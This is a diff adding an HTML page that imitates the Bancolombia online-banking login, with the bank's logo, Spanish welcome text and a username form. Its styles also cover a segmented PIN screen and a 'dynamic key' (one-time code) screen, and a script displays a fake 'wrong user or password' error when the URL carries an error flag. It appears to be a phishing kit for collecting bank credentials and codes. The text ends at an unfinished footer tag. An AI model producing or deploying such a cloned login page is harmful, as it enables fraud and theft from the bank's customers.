@@ -1,0 +1,1069 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <script type="module" crossorigin="" src="/assets/index-CZ8q79yM.js"></script>
+    <link rel="stylesheet" crossorigin="" href="/assets/index-Bvq6icfJ.css">
+  </head>
+  <body>
+    <div id="root"><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><div class="" data-scroll-view="bancolombia-login"><div class="min-h-screen flex flex-col" style="background-color: rgb(248, 248, 248); font-family: &quot;Open Sans&quot;, sans-serif;"><style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        
+        .bc-header {
+          background-color: #ffffff;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          padding: 16px 20px;
+          box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+          position: relative;
+        }
+        
+        .bc-header-logo {
+          height: 48px;
+          width: auto;
+        }
+        
+        .bc-header-exit {
+          color: #666;
+          text-decoration: none;
+          font-weight: 400;
+          font-size: 14px;
+        }
+        
+        .bc-options-container {
+          flex-grow: 1;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          padding: 20px;
+          max-width: 400px;
+          margin: 0 auto;
+          width: 100%;
+        }
+        
+        .bc-options-title {
+          font-size: 24px;
+          font-weight: 700;
+          color: #333;
+          margin-bottom: 6px;
+          text-align: center;
+        }
+        
+        .bc-options-subtitle {
+          font-size: 14px;
+          color: #666;
+          margin-bottom: 30px;
+          text-align: center;
+        }
+        
+        .bc-options-list {
+          width: 100%;
+          display: flex;
+          flex-direction: column;
+          gap: 16px;
+          margin-bottom: 30px;
+        }
+        
+        .bc-option-box {
+          display: flex;
+          justify-content: space-between;
+          align-items: stretch;
+          background-color: #fff;
+          border-radius: 8px;
+          box-shadow: 0 1px 4px rgba(0, 0, 0, 0.08);
+          text-decoration: none;
+          color: inherit;
+          overflow: hidden;
+          transition: transform 0.2s ease, box-shadow 0.2s ease;
+          cursor: pointer;
+          border: 1px solid #f0f0f0;
+          min-height: 80px;
+        }
+        
+        .bc-option-box:hover {
+          transform: translateY(-2px);
+          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .bc-option-personas {
+          border: none;
+          background: white;
+          position: relative;
+        }
+        
+        .bc-option-mano {
+          border: none;
+          background: white;
+          position: relative;
+        }
+        
+        .bc-option-text {
+          padding: 20px;
+          flex-grow: 1;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          min-height: 80px;
+        }
+        
+        .bc-option-text h3 {
+          font-size: 18px;
+          font-weight: 800;
+          color: #333;
+          margin: 0 0 4px 0;
+        }
+        
+        .bc-option-text p {
+          font-size: 14px;
+          color: #666;
+          margin: 0;
+          white-space: nowrap;
+          overflow: hidden;
+          text-overflow: ellipsis;
+        }
+        
+        .bc-option-arrow {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          width: 30px;
+          font-size: 18px;
+          font-weight: bold;
+          flex-shrink: 0;
+          align-self: stretch;
+          padding: 0 8px;
+          box-sizing: border-box;
+        }
+        
+        .bc-arrow-yellow {
+          background-color: #fdda24;
+          color: #454444;
+          border-radius: 0 8px 8px 0;
+        }
+        
+        .bc-arrow-orange {
+          background-color: #ff7f41;
+          color: #454444;
+          border-radius: 0 8px 8px 0;
+        }
+        
+        .bc-choice-link {
+          color: #333;
+          text-decoration: underline;
+          font-size: 14px;
+          font-weight: 700;
+          text-align: center;
+          display: block;
+          margin: 20px auto;
+        }
+        
+        .bc-choice-link:hover {
+          text-decoration: underline;
+        }
+        
+        .bc-background-section {
+          background-image: url('/assets/backgroundcolombia_1754699724272-FYm5soL6.png');
+          background-repeat: no-repeat;
+          background-size: contain;
+          background-position: center;
+          height: 200px;
+          width: 100vw;
+          position: relative;
+          left: 50%;
+          right: 50%;
+          margin-left: -50vw;
+          margin-right: -50vw;
+          margin-top: 20px;
+          min-height: 200px;
+        }
+        
+        @media (max-width: 768px) {
+          .bc-background-section {
+            height: 150px;
+            min-height: 150px;
+          }
+        }
+        
+        .bc-app-footer {
+          background-color: white;
+          padding: 20px;
+          text-align: center;
+          border-top: 1px solid #e5e5e5;
+        }
+        
+        .bc-footer-hr {
+          border: none;
+          border-top: 1px solid #e5e5e5;
+          margin: 0 0 20px 0;
+        }
+        
+        .bc-footer-logo {
+          height: 40px;
+          margin: 0 auto 10px auto;
+        }
+        
+        .bc-vigilado-logo {
+          height: 20px;
+          margin: 0 auto;
+        }
+        
+        .bc-footer-ip,
+        .bc-footer-date {
+          font-size: 12px;
+          color: #000;
+          margin: 5px 0;
+        }
+        
+        .loader-container-active {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          flex-grow: 1;
+          background-color: transparent;
+        }
+        
+        .checkout__loader {
+          background-color: white;
+          text-align: center;
+          padding: 0px;
+          border-radius: 120px;
+          width: 150px;
+          height: 150px;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+        }
+        
+        .checkout__loader p {
+          margin: 10px 0 0 0;
+          font-family: 'Open Sans', sans-serif;
+          color: #333;
+          font-size: 14px;
+        }
+        
+        .spinner {
+          border: 2px solid rgba(0, 0, 0, 0.1);
+          width: 24px;
+          height: 24px;
+          border-radius: 50%;
+          border-left-color: rgb(79, 79, 79);
+          animation: spin 1s ease infinite;
+        }
+        
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+        
+        .bc-login-form,
+        .bc-banking-form {
+          background: white;
+          border-radius: 12px;
+          padding: 30px;
+          box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+          width: 100%;
+          max-width: 400px;
+        }
+        
+        .bc-form-title {
+          font-size: 24px;
+          font-weight: 700;
+          color: #333;
+          margin-bottom: 20px;
+          text-align: center;
+        }
+        
+        .bc-form-subtitle {
+          font-size: 14px;
+          color: #666;
+          margin-bottom: 25px;
+          text-align: center;
+        }
+        
+        .bc-welcome-container {
+          flex-grow: 1;
+          display: flex;
+          flex-direction: column;
+          justify-content: flex-start;
+          align-items: center;
+          padding: 40px 20px 20px 20px;
+          max-width: 400px;
+          margin: 0 auto;
+          width: 100%;
+          min-height: calc(100vh - 120px);
+          position: relative;
+        }
+        
+        .bc-mobile-header {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          background: white;
+          z-index: 20;
+          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+          display: none;
+        }
+        
+        .bc-mobile-header-content {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          padding: 16px 20px;
+          position: relative;
+        }
+        
+        .bc-mobile-logo {
+          height: 48px;
+          width: auto;
+        }
+        
+        .bc-mobile-exit {
+          color: #666;
+          text-decoration: none;
+          font-size: 14px;
+          position: absolute;
+          right: 20px;
+        }
+        
+        .bc-welcome-content {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          flex: 1;
+        }
+        
+        .bc-welcome-title {
+          font-size: 32px;
+          font-weight: 700;
+          color: #333;
+          margin-bottom: 30px;
+          margin-top: 10px;
+          line-height: 1.2;
+          text-align: center;
+          text-shadow: 1px 1px 3px rgba(255, 255, 255, 0.8);
+          position: relative;
+          z-index: 10;
+        }
+        
+        .bc-welcome-form {
+          background: rgba(255, 255, 255, 0.98);
+          backdrop-filter: blur(15px);
+          border-radius: 15px;
+          padding: 24px;
+          width: 309px;
+          height: 239px;
+          text-align: center;
+          box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+          position: relative;
+          z-index: 10;
+          box-sizing: content-box;
+          margin: 115px auto;
+          border: 0;
+        }
+        
+        .bc-welcome-subtitle-container {
+          margin-bottom: 40px;
+        }
+        
+        .bc-welcome-subtitle-line {
+          font-size: 16px;
+          color: #333;
+          margin: 0;
+          line-height: 1.4;
+        }
+        
+        .bc-welcome-subtitle-line:first-child {
+          margin-bottom: 4px;
+        }
+        
+        .bc-form-fields {
+          display: flex;
+          flex-direction: column;
+          gap: 20px;
+        }
+        
+        .bc-input-group {
+          text-align: center;
+          display: flex;
+          justify-content: center;
+        }
+        
+        .bc-input-with-icon {
+          position: relative;
+          display: flex;
+          align-items: center;
+          width: 70%;
+          max-width: 300px;
+        }
+        
+        .bc-input-icon {
+          position: absolute;
+          left: 0;
+          top: 50%;
+          transform: translateY(-50%);
+          color: #666;
+          z-index: 2;
+        }
+        
+        .bc-input-icon-svg {
+          position: absolute;
+          left: 0;
+          top: 50%;
+          transform: translateY(-50%);
+          width: 20px;
+          height: 20px;
+          z-index: 2;
+          pointer-events: none;
+          opacity: 0.7;
+        }
+        
+        .bc-underline-input {
+          background: transparent !important;
+          border: none !important;
+          border-bottom: 2px solid #737171 !important;
+          border-radius: 0 !important;
+          padding: 12px 20px 12px 30px !important;
+          font-size: 16px !important;
+          outline: none !important;
+          transition: border-color 0.3s ease !important;
+          box-shadow: none !important;
+          width: 100% !important;
+          color: #000 !important;
+        }
+        
+        .bc-underline-input:focus {
+          border-bottom-color: #fdda24 !important;
+          box-shadow: none !important;
+        }
+        
+        .bc-underline-input::placeholder {
+          color: #666;
+        }
+        
+        .bc-forgot-link {
+          text-align: right;
+          margin-top: -10px;
+        }
+        
+        .bc-forgot-link a {
+          color: #333;
+          font-size: 14px;
+          text-decoration: none;
+        }
+        
+        .bc-forgot-link a:hover {
+          text-decoration: underline;
+        }
+        
+        .bc-continue-button {
+          width: 100% !important;
+          height: 48px !important;
+          padding: 12px 20px !important;
+          font-size: 16px !important;
+          border-radius: 25px !important;
+          border: none !important;
+          font-weight: 600 !important;
+          transition: all 0.2s ease !important;
+          margin-top: 20px !important;
+        }
+        
+        .bc-continue-button:disabled {
+          background: #ccc !important;
+          color: #999 !important;
+          cursor: not-allowed !important;
+        }
+        
+        .bc-continue-button:not(:disabled) {
+          background: #fdda24 !important;
+          color: #000 !important;
+          cursor: pointer !important;
+        }
+        
+        .bc-continue-button:not(:disabled):hover {
+          background: #e6c200 !important;
+        }
+
+        /* Password screen styles */
+        .bc-password-input-section {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          gap: 15px;
+          margin: 10px 0;
+        }
+        
+        .bc-password-lock-container {
+          display: flex;
+          justify-content: center;
+        }
+        
+        .bc-password-lock-icon {
+          width: 30px;
+          height: 30px;
+          opacity: 0.7;
+        }
+        
+        .bc-password-segments {
+          display: flex;
+          gap: 15px;
+          justify-content: center;
+        }
+        
+        .bc-password-segment {
+          width: 40px !important;
+          height: 40px !important;
+          background: transparent !important;
+          border: none !important;
+          border-bottom: 2px solid #737171 !important;
+          border-radius: 0 !important;
+          text-align: center !important;
+          font-size: 20px !important;
+          font-weight: bold !important;
+          outline: none !important;
+          transition: border-color 0.3s ease !important;
+          color: #000 !important;
+          padding: 0 !important;
+          font-family: 'Open Sans', sans-serif !important;
+          /* Ocultar números pero mantener teclado numérico */
+          -webkit-text-security: disc !important;
+          text-security: disc !important;
+        }
+        
+        .bc-password-segment:focus {
+          border-bottom-color: #fdda24 !important;
+        }
+        
+        .bc-password-buttons {
+          display: flex;
+          gap: 15px;
+          margin-top: 30px;
+          justify-content: center;
+          align-items: center;
+          width: 100%;
+          max-width: 350px;
+        }
+        
+        .bc-back-button {
+          background: transparent !important;
+          color: #000 !important;
+          border: 2px solid #000 !important;
+          border-radius: 25px !important;
+          padding: 12px 0 !important;
+          font-size: 16px !important;
+          font-weight: 600 !important;
+          width: 130px !important;
+          height: 48px !important;
+          transition: all 0.3s ease !important;
+          display: flex !important;
+          align-items: center !important;
+          justify-content: center !important;
+          margin: 0 !important;
+        }
+        
+        .bc-back-button:hover {
+          background: #f0f0f0 !important;
+          color: #000 !important;
+        }
+        
+        .bc-password-continue {
+          width: 130px !important;
+          height: 48px !important;
+          padding: 12px 0 !important;
+          font-size: 16px !important;
+          display: flex !important;
+          align-items: center !important;
+          justify-content: center !important;
+          margin: 0 !important;
+        }
+
+        /* Dynamic key screen styles */
+        .bc-dynamic-input-section {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          gap: 15px;
+          margin: 10px 0;
+        }
+        
+        .bc-dynamic-segments {
+          display: flex;
+          gap: 15px;
+          justify-content: center;
+        }
+        
+        .bc-dynamic-segment {
+          width: 40px !important;
+          height: 40px !important;
+          border: none !important;
+          border-bottom: 2px solid #737171 !important;
+          background: transparent !important;
+          text-align: center !important;
+          font-size: 20px !important;
+          font-weight: 600 !important;
+          color: #000 !important;
+          outline: none !important;
+          padding: 8px 0 !important;
+          font-family: 'Open Sans', sans-serif !important;
+          /* Ocultar números pero mantener teclado numérico */
+          -webkit-text-security: disc !important;
+          text-security: disc !important;
+        }
+        
+        .bc-dynamic-segment:focus {
+          border-bottom-color: #fdda24 !important;
+        }
+        
+        .bc-dynamic-buttons {
+          display: flex;
+          flex-direction: column;
+          gap: 15px;
+          margin-top: 30px;
+          align-items: stretch;
+          width: 100%;
+          padding: 0 20px;
+        }
+        
+        .bc-dynamic-continue {
+          width: 100% !important;
+          height: 48px !important;
+          padding: 12px 20px !important;
+          font-size: 16px !important;
+          border-radius: 25px !important;
+          border: none !important;
+          font-weight: 600 !important;
+          transition: all 0.2s ease !important;
+        }
+        
+        .bc-dynamic-continue:disabled {
+          background: #ccc !important;
+          color: #999 !important;
+          cursor: not-allowed !important;
+        }
+        
+        .bc-dynamic-continue:not(:disabled) {
+          background: #fdda24 !important;
+          color: #000 !important;
+          cursor: pointer !important;
+        }
+        
+        .bc-dynamic-continue:not(:disabled):hover {
+          background: #e6c200 !important;
+        }
+        
+        .bc-dynamic-cancel {
+          background: transparent !important;
+          color: #000 !important;
+          border: 2px solid #000 !important;
+          border-radius: 25px !important;
+          width: 100% !important;
+          height: 48px !important;
+          padding: 12px 20px !important;
+          font-size: 16px !important;
+          font-weight: 600 !important;
+          cursor: default !important;
+        }
+        
+        .bc-background-section {
+          background-image: url(/assets/backgroundcolombia_1754699724272-FYm5soL6.png);
+          background-repeat: no-repeat;
+          background-size: cover;
+          background-position: center center;
+          height: 200px;
+          width: 100vw;
+          margin: 30px 0 0 0;
+          z-index: 1;
+          min-height: 200px;
+          position: relative;
+          left: 50%;
+          transform: translateX(-50%);
+        }
+        
+        /* Responsive styles */
+        @media (max-width: 768px) {
+          .bc-welcome-container {
+            background-attachment: scroll;
+            background-size: cover;
+            background-position: center center;
+            padding: 60px 15px 20px 15px;
+            min-height: calc(100vh - 120px);
+            height: auto;
+            margin: 0 auto;
+            max-width: 400px;
+            justify-content: flex-start;
+          }
+          
+          .bc-mobile-header {
+            display: block;
+          }
+          
+          .bc-welcome-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 25px;
+            position: relative;
+            z-index: 15;
+          }
+          
+          .bc-welcome-form {
+            padding: 24px;
+            margin: 0 10px;
+            width: 320px;
+          }
+          
+          .bc-welcome-subtitle {
+            font-size: 16px;
+            margin-bottom: 30px;
+            font-weight: 400;
+          }
+          
+          .bc-welcome-subtitle strong {
+            font-weight: 700;
+          }
+        }
+        
+        .bc-mobile-footer {
+          position: relative;
+          bottom: auto;
+          left: 0;
+          width: 100%;
+          background: white;
+          z-index: 20;
+          border-top: 1px solid #eee;
+          display: none;
+          margin-top: 20px;
+        }
+        
+        .bc-footer-content {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          padding: 20px;
+          text-align: center;
+        }
+        
+        .bc-footer-logo {
+          height: 40px;
+          width: auto;
+          margin-bottom: 15px;
+        }
+        
+        .bc-footer-vigilado {
+          height: 32px;
+          width: auto;
+          margin-bottom: 15px;
+        }
+        
+        .bc-footer-ip {
+          font-size: 12px;
+          color: #666;
+          line-height: 1.3;
+        }
+        
+        .bc-footer-ip p {
+          margin: 2px 0;
+        }
+        
+        @media (max-width: 768px) {
+          .bc-mobile-footer {
+            display: block;
+          }
+          
+          .bc-welcome-container {
+            padding: 80px 15px 80px 15px;
+          }
+        }
+        
+        @media (max-width: 480px) {
+          .bc-welcome-title {
+            font-size: 22px;
+            margin-bottom: 20px;
+          }
+          
+          .bc-welcome-form {
+            padding: 24px;
+            border-radius: 12px;
+            width: calc(100vw - 88px);
+            max-width: 309px;
+            height: auto;
+            min-height: 239px;
+            margin: 20px auto;
+            box-sizing: content-box;
+            border: 0;
+          }
+          
+          .bc-continue-button {
+            height: 42px !important;
+            font-size: 14px !important;
+            padding: 10px 15px !important;
+          }
+          
+          .bc-input-with-icon {
+            width: 80%;
+            max-width: 280px;
+          }
+          
+          .bc-password-input-section {
+            gap: 12px;
+            margin: 15px 0;
+          }
+          
+          .bc-password-lock-icon {
+            width: 25px;
+            height: 25px;
+          }
+          
+          .bc-password-segments {
+            gap: 10px;
+          }
+          
+          .bc-password-segment {
+            width: 35px !important;
+            height: 35px !important;
+            font-size: 18px !important;
+          }
+          
+          .bc-password-segment.error {
+            border: 2px solid #dc2626 !important;
+            background-color: #fef2f2 !important;
+          }
+          
+          .bc-password-buttons {
+            flex-direction: row;
+            gap: 10px;
+            margin-top: 25px;
+            max-width: 300px;
+            align-items: center;
+          }
+          
+          .bc-back-button {
+            padding: 10px 0 !important;
+            font-size: 14px !important;
+            width: 110px !important;
+            height: 42px !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            margin: 0 !important;
+          }
+          
+          .bc-password-continue {
+            padding: 10px 0 !important;
+            font-size: 14px !important;
+            width: 110px !important;
+            height: 42px !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            margin: 0 !important;
+          }
+          
+          .bc-dynamic-input-section {
+            gap: 12px;
+            margin: 15px 0;
+          }
+          
+          .bc-dynamic-segments {
+            gap: 8px;
+          }
+          
+          .bc-dynamic-segment {
+            width: 32px !important;
+            height: 35px !important;
+            font-size: 18px !important;
+          }
+          
+          .bc-dynamic-segment.error {
+            border: 2px solid #dc2626 !important;
+            background-color: #fef2f2 !important;
+          }
+          
+          .bc-dynamic-buttons {
+            gap: 12px;
+            margin-top: 25px;
+            padding: 0 15px;
+          }
+          
+          .bc-dynamic-continue {
+            height: 42px !important;
+            font-size: 14px !important;
+            padding: 10px 15px !important;
+          }
+          
+          .bc-dynamic-continue:disabled {
+            background: #ccc !important;
+            color: #999 !important;
+          }
+          
+          .bc-dynamic-continue:not(:disabled) {
+            background: #fdda24 !important;
+            color: #000 !important;
+          }
+          
+          .bc-dynamic-cancel {
+            height: 42px !important;
+            font-size: 14px !important;
+            padding: 10px 15px !important;
+          }
+          
+          .bc-welcome-container {
+            padding: 70px 10px 20px 10px;
+            background-size: cover;
+            background-position: center center;
+            background-attachment: scroll;
+          }
+          
+          .bc-background-section {
+            height: 150px;
+            margin-top: 20px;
+            min-height: 150px;
+            width: 100vw;
+            background-size: cover;
+            left: 50%;
+            transform: translateX(-50%);
+          }
+          
+          .bc-mobile-header {
+            display: block;
+          }
+        }
+          .bc-error-notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 4px;
+            z-index: 1000;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            display: none;
+            width: 90%;
+            max-width: 400px;
+        }
+        .bc-error-title {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 5px;
+            display: block;
+        }
+        .bc-error-message {
+            font-size: 14px;
+        }
+    </style>
+    <!-- Notificación de error -->
+    <div id="errorNotification" class="bc-error-notification">
+        <span class="bc-error-title">USUARIO O CLAVE INCORRECTA</span>
+        <span class="bc-error-message">Verifica la informacion e intentalo de nuevo.</span>
+    </div>
+
+    <script>
+        // Verificar si venimos de un error (URL tiene ?error=true)
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('error')) {
+                const notification = document.getElementById('errorNotification');
+                notification.style.display = 'block';
+                
+                // Ocultar después de 3 segundos
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                    // Limpiar la URL para que no salga al recargar
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                }, 3000);
+            }
+        });
+    </script>
+    <header class="bc-header"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPEAAABACAMAAAD8g2HrAAAC3FBMVEUAAAAAAAAAAABVAABAQEAzMzMrKyskJCQgICA5HBwzMzMuLi4rKysnJyckJCQzIiIwMDAtLS0rKysoKCgmJiYxJCQuLi4sLCwrKyspKSknJycvJiYuLiQsLCwrKyspKSkwKCguJyctLSYsLCwrKyspKSkvKCguJyctLSYsLCwrKysqKiouKSktKCgsLCcrKysrKysqKiouKSktKCgsLCcrKysrKysqKiouKSktKCgsLCgrKycrKysuKiotKSktKCgsLCgrKycrKystKSksKSksLCgtKSksKSksLCgrKygrKystKiotKSksKSksLCgrKygrKystKiosKiosKSkrKSkrKygtKygtKiosKiosKSkrKSkrKygtKygtKiosKiosKSkrKSktKiosKiosKSkrKSkrKyktKygsKiosKiosKSkrKSktKygsKigsKiosKSkrKSktKyktKygsKigsKSkrKSktKyktKygsKigsKiorKiorKSksKyksKigsKiorKiorKSktKyksKyksKigsKiorKiorKSktKyksKyksKigsKigrKiotKSksKyksKyksKiksKigrKiotKSksKyksKyksKiksKigrKiotKSksKyksKyksKiksKigrKiotKSksKyksKyksKiksKiktKigsKiosKSksKykrKiktKigsKiosKSksKyksKikrKiktKigsKiosKSksKikrKiktKigsKiosKSksKyksKikrKiksKiksKiosKSksKyksKiktKiksKiksKigsKSksKyksKiksKiksKigsKSksKiktKiksKiksKiksKiosKykrKiksKiksKiksKiksKiosKykrKiksKiksKiksKiksKigsKyktKiksKiksKiksKiksKigsKyksKiksKiksKiksKiksKiksKyksKiksKiksKiksKiksKiksKyksKiksKiksKiksKiksKiksKyksKiksKiksKin///+1jVOfAAAA8nRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCREVGSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZ2hpamtsbW5vcHJzdHV2d3h5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" alt="Bancolombia" class="bc-header-logo"><a href="#" class="bc-header-exit" style="position: absolute; right: 20px;">Salir ❯</a></header><main class="bc-options-container"><div style="" class="bc-welcome-container"><div class="bc-welcome-content"><h1 class="bc-welcome-title">Te damos la bienvenida</h1><div class="bc-welcome-form"><div class="bc-welcome-subtitle-container"><p class="bc-welcome-subtitle-line">El usuario es el mismo con el que ingresas</p><p class="bc-welcome-subtitle-line">a la <strong>Sucursal Virtual Personas</strong></p></div><form class="bc-form-fields"><div class="bc-input-group"><div class="bc-input-with-icon"><img src="data:image/svg+xml,%3csvg%20width='24'%20height='25'%20viewBox='0%200%2024%2025'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M9%207.02124C9%205.36724%2010.346%204.02124%2012%204.02124C13.654%204.02124%2015%205.36724%2015%207.02124V8.50024C15%209.97624%2014.267%2013.0222%2012%2013.0222C9.733%2013.0222%209%209.97624%209%208.50024V7.02124ZM8%208.50024C8%2010.7932%209.241%2014.0222%2012%2014.0222C14.759%2014.0222%2016%2010.7932%2016%208.50024V7.02124C16%204.81524%2014.206%203.02124%2012%203.02124C9.794%203.02124%208%204.81524%208%207.02124V8.50024ZM20%2019.5212V20.0212H4V19.5212C4%2017.5262%205.332%2015.7692%207.216%2015.2082C8.185%2016.9302%2010.02%2018.0212%2012%2018.0212C13.98%2018.0212%2015.815%2016.9302%2016.784%2015.2082C18.668%2015.7692%2020%2017.5262%2020%2019.5212ZM3%2021.0212H21V19.5212C21%2016.9282%2019.159%2014.6642%2016.622%2014.1372L16.235%2014.0572L16.067%2014.4152C15.328%2015.9982%2013.731%2017.0212%2012%2017.0212C10.269%2017.0212%208.672%2015.9982%207.933%2014.4152L7.765%2014.0572L7.378%2014.1372C4.841%2014.6642%203%2016.9282%203%2019.5212V21.0212Z'%20fill='%232C2A29'/%3e%3c/svg%3e" alt="Usuario" class="bc-input-icon-svg"><input type="text" class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm bc-underline-input" id="usuario" placeholder="Usuario" name="usuario" data-testid="input-usuario"></div></div><div class="bc-forgot-link"><a href="#">¿Olvidaste tu usuario?</a></div><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 btn-gradient text-white hover:opacity-90 h-10 px-4 py-2 bc-continue-button" type="submit" data-testid="button-login-submit">Continuar</button></form></div><div class="bc-background-section"></div></div></div></main><footer 